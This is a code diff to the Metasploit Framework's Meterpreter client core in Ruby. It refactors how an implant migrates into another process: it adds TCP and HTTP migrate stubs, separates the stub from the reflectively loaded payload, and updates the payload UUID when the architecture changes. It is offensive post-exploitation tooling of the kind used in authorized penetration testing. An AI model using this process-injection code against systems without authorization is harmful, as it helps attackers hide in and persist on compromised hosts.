@@ -7,6 +7,8 @@ require 'rex/post/meterpreter/client'
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
 require 'msf/core/payload/windows'
+require 'msf/core/payload/windows/migrate'
+require 'msf/core/payload/windows/x64/migrate'
 
 # URI uuid and checksum stuff
 require 'msf/core/payload/uuid'
@@ -296,16 +298,13 @@ class ClientCore < Extension
     return true
   end
 
-  def uuid(timeout=nil)
-    request = Packet.create_request('core_uuid')
+  def set_uuid(uuid)
+    request = Packet.create_request('core_set_uuid')
+    request.add_tlv(TLV_TYPE_UUID, uuid.to_raw)
 
-    args = [ request ]
-    args << timeout if timeout
-    response = client.send_request(*args)
+    client.send_request(request)
 
-    id = response.get_tlv_value(TLV_TYPE_UUID)
-
-    return Msf::Payload::UUID.new({:raw => id})
+    true
   end
 
   def machine_id(timeout=nil)
@@ -431,44 +430,45 @@ class ClientCore < Extension
   # Migrates the meterpreter instance to the process specified
   # by pid.  The connection to the server remains established.
   #
-  def migrate(pid, writable_dir = nil, opts = {})
+  def migrate(target_pid, writable_dir = nil, opts = {})
     keepalive              = client.send_keepalives
     client.send_keepalives = false
-    process                = nil
-    binary_suffix          = nil
-    old_platform           = client.platform
-    old_binary_suffix      = client.binary_suffix
+    target_process         = nil
+    current_process        = nil
 
     # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
     client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')
 
-    # Determine the architecture for the pid we are going to migrate into...
+    current_pid = client.sys.process.getpid
+
+    # Find the current and target process instances
     client.sys.process.processes.each { | p |
-      if p['pid'] == pid
-        process = p
-        break
+      if p['pid'] == target_pid
+        target_process = p
+      elsif p['pid'] == current_pid
+        current_process = p
       end
     }
 
     # We cant migrate into a process that does not exist.
-    unless process
+    unless target_process
       raise RuntimeError, 'Cannot migrate into non existent process', caller
     end
 
     # We cannot migrate into a process that we are unable to open
     # On linux, arch is empty even if we can access the process
-    if client.platform =~ /win/
-      if process['arch'] == nil || process['arch'].empty?
+    if client.platform == 'windows'
+      if target_process['arch'] == nil || target_process['arch'].empty?
         raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
       end
     end
 
     # And we also cannot migrate into our own current process...
-    if process['pid'] == client.sys.process.getpid
+    if current_process['pid'] == target_process['pid']
       raise RuntimeError, 'Cannot migrate into current process', caller
     end
 
-    if client.platform =~ /linux/
+    if client.platform == 'linux'
       if writable_dir.to_s.strip.empty?
         writable_dir = tmp_folder
       end
@@ -481,40 +481,50 @@ class ClientCore < Extension
       # Rex::Post::FileStat#writable? isn't available
     end
 
-    blob = generate_payload_stub(process)
+    migrate_stub = generate_migrate_stub(target_process)
+    migrate_payload = generate_migrate_payload(target_process)
 
     # Build the migration request
     request = Packet.create_request('core_migrate')
 
-    if client.platform =~ /linux/i
+    if client.platform == 'linux'
       socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
 
       if socket_path.length > UNIX_PATH_MAX - 1
         raise RuntimeError, 'The writable dir is too long', caller
       end
 
-      pos = blob.index(DEFAULT_SOCK_PATH)
+      pos = migrate_payload.index(DEFAULT_SOCK_PATH)
 
       if pos.nil?
         raise RuntimeError, 'The meterpreter binary is wrong', caller
       end
 
-      blob[pos, socket_path.length + 1] = socket_path + "\x00"
+      migrate_payload[pos, socket_path.length + 1] = socket_path + "\x00"
 
-      ep = elf_ep(blob)
+      ep = elf_ep(migrate_payload)
       request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
       request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
       request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
+    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
 
-    if process['arch'] == ARCH_X86_64
+    if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
+
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
+    end
+
+    # if we change architecture, we need to change UUID as well
+    if current_process['arch'] != target_process['arch']
+      client.payload_uuid.arch = target_process['arch']
+      request.add_tlv( TLV_TYPE_UUID, client.payload_uuid.to_raw )
     end
 
     # Send the migration request. Timeout can be specified by the caller, or set to a min
@@ -558,30 +568,6 @@ class ClientCore < Extension
       end
     end
 
-    # Update the meterpreter platform/suffix for loading extensions as we may
-    # have changed target architecture
-    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a
-    # module this is the simplest solution I could think of. If the platform
-    # specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change
-    # significantly we will need a better way to do this.
-
-    case client.platform
-    when /win/i
-      if process['arch'] == ARCH_X86_64
-        client.platform      = 'x64/win64'
-        client.binary_suffix = 'x64.dll'
-      else
-        client.platform      = 'x86/win32'
-        client.binary_suffix = 'x86.dll'
-      end
-    when /linux/i
-      client.platform        = 'x86/linux'
-      client.binary_suffix   = 'lso'
-    else
-      client.platform        = old_platform
-      client.binary_suffix   = old_binary_suffix
-    end
-
     # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
     client.ext.aliases.keys.each { |e|
       client.core.use(e)
@@ -623,7 +609,47 @@ class ClientCore < Extension
     end
   end
 
-  private
+private
+
+  def get_current_transport
+    transport_list[:transports][0]
+  end
+
+  def generate_migrate_stub(target_process)
+    stub = nil
+
+    if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
+      t = get_current_transport
+
+      c = Class.new(::Msf::Payload)
+
+      if target_process['arch'] == ARCH_X86
+        c.include(::Msf::Payload::Windows::BlockApi)
+        case t[:url]
+        when /^tcp/i
+          c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^http/i
+          # Covers HTTP and HTTPS
+          c.include(::Msf::Payload::Windows::MigrateHttp)
+        end
+      else
+        c.include(::Msf::Payload::Windows::BlockApi_x64)
+        case t[:url]
+        when /^tcp/i
+          c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^http/i
+          # Covers HTTP and HTTPS
+          c.include(::Msf::Payload::Windows::MigrateHttp_x64)
+        end
+      end
+
+      stub = c.new().generate
+    else
+      raise RuntimeError, "Unsupported session #{client.session_type}"
+    end
+
+    stub
+  end
 
   def transport_prepare_request(method, opts={})
     unless valid_transport?(opts[:transport]) && opts[:lport]
@@ -713,12 +739,12 @@ class ClientCore < Extension
   end
 
 
-  def generate_payload_stub(process)
+  def generate_migrate_payload(target_process)
     case client.platform
-    when /win/i
-      blob = generate_windows_stub(process)
-    when /linux/i
-      blob = generate_linux_stub
+    when 'windows'
+      blob = generate_migrate_windows_payload(target_process)
+    when 'linux'
+      blob = generate_migrate_linux_payload
     else
       raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
@@ -726,31 +752,27 @@ class ClientCore < Extension
     blob
   end
 
-  def generate_windows_stub(process)
+  def generate_migrate_windows_payload(target_process)
     c = Class.new( ::Msf::Payload )
     c.include( ::Msf::Payload::Stager )
 
     # Include the appropriate reflective dll injection module for the target process architecture...
-    if process['arch'] == ARCH_X86
+    if target_process['arch'] == ARCH_X86
       c.include( ::Msf::Payload::Windows::MeterpreterLoader )
-    elsif process['arch'] == ARCH_X86_64
+    elsif target_process['arch'] == ARCH_X64
       c.include( ::Msf::Payload::Windows::MeterpreterLoader_x64 )
     else
-      raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
+      raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
     end
 
     # Create the migrate stager
     migrate_stager = c.new()
 
-    blob = migrate_stager.stage_meterpreter
-
-    blob
+    migrate_stager.stage_meterpreter
   end
 
-  def generate_linux_stub
-    blob = MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
-
-    blob
+  def generate_migrate_linux_payload
+    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
   end
 
   def elf_ep(payload)
